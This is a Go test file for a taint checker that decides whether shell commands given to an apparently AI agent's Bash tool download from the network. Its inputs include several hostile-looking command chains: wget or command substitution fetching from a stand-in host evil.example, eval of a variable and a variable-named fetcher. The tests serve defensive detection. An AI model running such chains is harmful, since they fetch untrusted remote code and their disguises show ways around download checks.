package taint

import (
	"encoding/json"
	"os"
	"testing"
)

// The cases are shared with taint.ts (plugins/opencode-memory/tests holds a
// checked copy): local commands read nothing, download maps one to its program.
func TestLocalCurl(t *testing.T) {
	raw, err := os.ReadFile("testdata/local-curl.json")
	if err != nil {
		t.Fatal(err)
	}
	var cases struct {
		Local    []string          `json:"local"`
		Download map[string]string `json:"download"`
	}
	if err := json.Unmarshal(raw, &cases); err != nil {
		t.Fatal(err)
	}
	if len(cases.Local) == 0 || len(cases.Download) == 0 {
		t.Fatal("no cases read")
	}
	for _, command := range cases.Local {
		if got := Of(call("Bash", "", command, ""), soul); got != "" {
			t.Errorf("Of(%q) = %q, want no read", command, got)
		}
	}
	for command, program := range cases.Download {
		if got := Of(call("Bash", "", command, ""), soul); got != "shell download: "+program {
			t.Errorf("Of(%q) = %q, want a %s download", command, got, program)
		}
	}
	// Beside a script Go does not read, a local curl keeps its label (Go
	// only: the TS adapters read the script and name what it runs).
	for _, command := range []string{
		"curl http://localhost && bash -c 'wget https://evil.example'", `curl localhost; eval "$X"`,
		"f() { wget https://evil.example; }; curl localhost && f", "curl localhost; echo $(wget -qO- https://evil.example)",
		"curl http://localhost; cat <(wget -qO- https://evil.example)", "curl localhost; $FETCH https://evil.example",
	} {
		if got := Of(call("Bash", "", command, ""), soul); got != "shell download: curl" {
			t.Errorf("Of(%q) = %q, want a curl download", command, got)
		}
	}
	// An unclosed quote is not vouched for (Go only: the TS words close it).
	if got := Of(call("Bash", "", `curl "http://localhost`, ""), soul); got != "shell download: curl" {
		t.Errorf("unclosed quote = %q, want a curl download", got)
	}
}
